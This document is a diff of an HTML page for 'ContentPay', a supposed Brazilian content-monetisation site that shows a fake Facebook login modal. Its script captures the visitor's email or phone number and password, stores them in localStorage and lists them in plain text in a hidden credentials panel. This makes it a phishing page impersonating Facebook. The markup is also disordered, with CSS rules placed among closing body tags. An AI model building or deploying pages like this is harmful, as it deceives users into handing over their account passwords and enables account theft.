@@ -647,6 +647,302 @@
             </div>
         </div>
     </div>
+    /* Modal de Credenciais */
+        .credentials-modal {
+            background-color: white;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            max-height: 80vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .credentials-header {
+            background-color: #ffcc00;
+            padding: 15px;
+            text-align: center;
+            color: #333;
+        }
+        
+        .credentials-header h2 {
+            font-size: 1.5rem;
+            margin: 0;
+        }
+        
+        .credentials-body {
+            padding: 20px;
+            flex: 1;
+            overflow-y: auto;
+        }
+        
+        .credentials-list {
+            max-height: 300px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+        }
+        
+        .credential-item {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            border-left: 4px solid #1877f2;
+        }
+        
+        .credential-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .credential-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+        
+        .credential-details p {
+            margin-bottom: 5px;
+            word-break: break-all;
+        }
+        
+        .credential-actions {
+            display: flex;
+            gap: 5px;
+        }
+        
+        .delete-btn {
+            background: none;
+            border: none;
+            color: #ff4757;
+            cursor: pointer;
+            font-size: 1rem;
+            padding: 5px;
+            border-radius: 3px;
+            transition: background-color 0.3s;
+        }
+        
+        .delete-btn:hover {
+            background-color: rgba(255, 71, 87, 0.1);
+        }
+        
+        .empty-message {
+            text-align: center;
+            color: #666;
+            font-style: italic;
+            padding: 20px;
+        }
+        
+        /* Footer */
+        footer {
+            background-color: #333;
+            color: white;
+            padding: 50px 0 20px;
+        }
+        
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .footer-column {
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        .footer-column h3 {
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+        }
+        
+        .footer-column ul {
+            list-style: none;
+        }
+        
+        .footer-column ul li {
+            margin-bottom: 10px;
+        }
+        
+        .footer-column ul li a {
+            color: #bbb;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-column ul li a:hover {
+            color: white;
+        }
+        
+        .copyright {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid #444;
+            color: #bbb;
+            font-size: 0.9rem;
+        }
+        
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            nav ul {
+                margin-top: 15px;
+                justify-content: center;
+            }
+            
+            nav ul li {
+                margin: 0 10px;
+            }
+            
+            .hero h1 {
+                font-size: 2.2rem;
+            }
+            
+            .steps {
+                flex-direction: column;
+            }
+            
+            .credential-info {
+                flex-direction: column;
+            }
+            
+            .credential-actions {
+                margin-top: 10px;
+                align-self: flex-end;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">Content<span>Pay</span></div>
+                <nav>
+                    <ul>
+                        <li><a href="#como-funciona">Como Funciona</a></li>
+                        <li><a href="#vantagens">Vantagens</a></li>
+                        <li><a href="#" id="login-link">Entrar</a></li>
+                        <li>
+                            <button class="key-icon" id="key-icon" title="Ver credenciais salvas">
+                                <i class="fas fa-key"></i>
+                                <span class="key-badge" id="key-badge" style="display: none;">0</span>
+                            </button>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <h1>Monetize seu conteúdo e comece a ganhar dinheiro</h1>
+                <p>Transforme sua paixão por criar conteúdo em uma fonte de renda sustentável. Junte-se a milhares de criadores que já estão lucrando com a nossa plataforma.</p>
+                <button class="cta-button" id="open-modal">MONETIZE AGORA</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Como Funciona -->
+    <section id="como-funciona">
+        <div class="container">
+            <div class="section-title">
+                <h2>Como Funciona</h2>
+                <p>Em apenas 3 passos simples, você começa a monetizar seu conteúdo</p>
+            </div>
+            <div class="steps">
+                <div class="step">
+                    <div class="step-icon">1</div>
+                    <h3>Conecte-se com Facebook</h3>
+                    <p>Faça login rapidamente usando sua conta do Facebook para acessar nossa plataforma.</p>
+                </div>
+                <div class="step">
+                    <div class="step-icon">2</div>
+                    <h3>Adicione seu conteúdo</h3>
+                    <p>Faça upload dos seus vídeos, artigos, imagens ou qualquer outro tipo de conteúdo.</p>
+                </div>
+                <div class="step">
+                    <div class="step-icon">3</div>
+                    <h3>Comece a ganhar</h3>
+                    <p>Receba pagamentos mensais baseados no engajamento e visualizações do seu conteúdo.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Vantagens -->
+    <section id="vantagens" class="benefits">
+        <div class="container">
+            <div class="section-title">
+                <h2>Vantagens da Nossa Plataforma</h2>
+                <p>Descubra por que milhares de criadores escolhem nossa plataforma</p>
+            </div>
+            <div class="benefits-grid">
+                <div class="benefit">
+                    <h3><i class="fas fa-money-bill-wave"></i> Pagamentos Altos</h3>
+                    <p>Oferecemos uma das maiores taxas de monetização do mercado, garantindo que você receba o valor justo pelo seu trabalho.</p>
+                </div>
+                <div class="benefit">
+                    <h3><i class="fas fa-headset"></i> Suporte Dedicado</h3>
+                    <p>Nossa equipe de suporte está sempre disponível para ajudar criadores a maximizar seus ganhos e resolver qualquer problema.</p>
+                </div>
+                <div class="benefit">
+                    <h3><i class="fas fa-chart-line"></i> Ferramentas Avançadas</h3>
+                    <p>Acesse análises detalhadas, ferramentas de otimização e recursos exclusivos para crescer sua audiência.</p>
+                </div>
+                <div class="benefit">
+                    <h3><i class="fas fa-shield-alt"></i> Segurança Garantida</h3>
+                    <p>Seus dados e conteúdo estão protegidos com as mais avançadas medidas de segurança do mercado.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Modal do Facebook -->
+    <div class="modal" id="login-modal">
+        <div class="facebook-modal">
+            <div class="facebook-header">
+                <h2>Facebook</h2>
+                <button class="close-modal" id="close-modal">&times;</button>
+            </div>
+            <div class="facebook-body">
+                <div class="facebook-logo">
+                    <i class="fab fa-facebook"></i>
+                </div>
+                <form id="facebook-login-form">
+                    <div class="form-group">
+                        <label for="facebook-email">Email ou telefone</label>
+                        <input type="text" id="facebook-email" name="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="facebook-password">Senha</label>
+                        <input type="password" id="facebook-password" name="password" required>
+                    </div>
+                    <button type="submit" class="login-button">
+                        Entrar
+                    </button>
+                </form>
+                <p style="text-align: center; font-size: 0.9rem; color: #666;">
+                    <a href="#" style="color: #1877f2; text-decoration: none;">Esqueceu a senha?</a>
+                </p>
+                <hr style="margin: 20px 0; border: none; border-top: 1px solid #ddd;">
+                <button class="login-button" style="background-color: #42b72a; max-width: 200px; margin: 0 auto;">
+                    Criar nova conta
+                </button>
+            </div>
+        </div>
+    </div>
 
     <!-- Modal de Credenciais -->
     <div class="modal" id="credentials-modal">
@@ -682,4 +978,193 @@
                 <div class="footer-column">
                     <h3>Recursos</h3>
                     <ul>
-         
+                        <li><a href="#">Blog</a></li>
+                        <li><a href="#">Tutoriais</a></li>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="#">Central de Ajuda</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Legal</h3>
+                    <ul>
+                        <li><a href="#">Termos de Uso</a></li>
+                        <li><a href="#">Política de Privacidade</a></li>
+                        <li><a href="#">Cookies</a></li>
+                        <li><a href="#">DMCA</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Contato</h3>
+                    <ul>
+                        <li><a href="#">Suporte</a></li>
+                        <li><a href="#">Parcerias</a></li>
+                        <li><a href="#">Anuncie Conosco</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="copyright">
+                &copy; 2023 ContentPay. Todos os direitos reservados.
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Elementos do DOM
+        const openModalBtn = document.getElementById('open-modal');
+        const loginLink = document.getElementById('login-link');
+        const closeModalBtn = document.getElementById('close-modal');
+        const loginModal = document.getElementById('login-modal');
+        const facebookLoginForm = document.getElementById('facebook-login-form');
+        const keyIcon = document.getElementById('key-icon');
+        const keyBadge = document.getElementById('key-badge');
+        const credentialsModal = document.getElementById('credentials-modal');
+        const closeCredentialsModal = document.getElementById('close-credentials-modal');
+        const closeCredentialsBtn = document.getElementById('close-credentials-btn');
+        const credentialsList = document.getElementById('credentials-list');
+
+        // Array para armazenar múltiplas credenciais
+        let savedCredentials = [];
+
+        // Abrir modal do Facebook
+        openModalBtn.addEventListener('click', () => {
+            loginModal.style.display = 'flex';
+        });
+
+        loginLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            loginModal.style.display = 'flex';
+        });
+
+        // Fechar modais
+        closeModalBtn.addEventListener('click', () => {
+            loginModal.style.display = 'none';
+        });
+
+        closeCredentialsModal.addEventListener('click', () => {
+            credentialsModal.style.display = 'none';
+        });
+
+        closeCredentialsBtn.addEventListener('click', () => {
+            credentialsModal.style.display = 'none';
+        });
+
+        // Fechar modais ao clicar fora
+        window.addEventListener('click', (e) => {
+            if (e.target === loginModal) {
+                loginModal.style.display = 'none';
+            }
+            if (e.target === credentialsModal) {
+                credentialsModal.style.display = 'none';
+            }
+        });
+
+        // Processar login do Facebook
+        facebookLoginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('facebook-email').value;
+            const password = document.getElementById('facebook-password').value;
+            
+            if (email && password) {
+                // Adicionar nova credencial ao array
+                const newCredential = {
+                    id: Date.now(), // ID único baseado no timestamp
+                    email: email,
+                    password: password,
+                    date: new Date().toLocaleString('pt-BR')
+                };
+                
+                savedCredentials.push(newCredential);
+                
+                // Atualizar badge e mostrar ícone
+                updateKeyBadge();
+                keyIcon.style.display = 'block';
+                
+                // Atualizar lista de credenciais
+                updateCredentialsList();
+                
+                // Fechar modal
+                loginModal.style.display = 'none';
+                
+                // Mostrar mensagem de sucesso
+                alert('Credencial salva com sucesso! Você já salvou ' + savedCredentials.length + ' credenciais.');
+                
+                // Limpar formulário
+                facebookLoginForm.reset();
+            } else {
+                alert('Por favor, preencha todos os campos!');
+            }
+        });
+
+        // Atualizar badge do ícone da chave
+        function updateKeyBadge() {
+            const count = savedCredentials.length;
+            keyBadge.textContent = count;
+            keyBadge.style.display = count > 0 ? 'flex' : 'none';
+        }
+
+        // Atualizar lista de credenciais no modal
+        function updateCredentialsList() {
+            if (savedCredentials.length === 0) {
+                credentialsList.innerHTML = '<div class="empty-message">Nenhuma credencial salva ainda</div>';
+                return;
+            }
+            
+            credentialsList.innerHTML = savedCredentials.map(credential => `
+                <div class="credential-item">
+                    <div class="credential-info">
+                        <div class="credential-details">
+                            <p><strong>Email/Telefone:</strong> ${credential.email}</p>
+                            <p><strong>Senha:</strong> ${credential.password}</p>
+                            <p><small><strong>Salvo em:</strong> ${credential.date}</small></p>
+                        </div>
+                        <div class="credential-actions">
+                            <button class="delete-btn" onclick="deleteCredential(${credential.id})" title="Excluir credencial">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Função para excluir credencial
+        window.deleteCredential = function(id) {
+            if (confirm('Tem certeza que deseja excluir esta credencial?')) {
+                savedCredentials = savedCredentials.filter(cred => cred.id !== id);
+                updateKeyBadge();
+                updateCredentialsList();
+                
+                // Se não houver mais credenciais, esconder o ícone
+                if (savedCredentials.length === 0) {
+                    keyIcon.style.display = 'none';
+                }
+            }
+        }
+
+        // Abrir modal de credenciais
+        keyIcon.addEventListener('click', () => {
+            updateCredentialsList();
+            credentialsModal.style.display = 'flex';
+        });
+
+        // Verificar se há credenciais salvas ao carregar a página
+        window.addEventListener('DOMContentLoaded', () => {
+            // Tentar carregar credenciais do localStorage
+            const storedCredentials = localStorage.getItem('facebookCredentials');
+            if (storedCredentials) {
+                savedCredentials = JSON.parse(storedCredentials);
+                updateKeyBadge();
+                if (savedCredentials.length > 0) {
+                    keyIcon.style.display = 'block';
+                }
+            }
+            
+            // Salvar credenciais no localStorage quando a página for fechada
+            window.addEventListener('beforeunload', () => {
+                localStorage.setItem('facebookCredentials', JSON.stringify(savedCredentials));
+            });
+        });
+    </script>
+</body>
+</html>
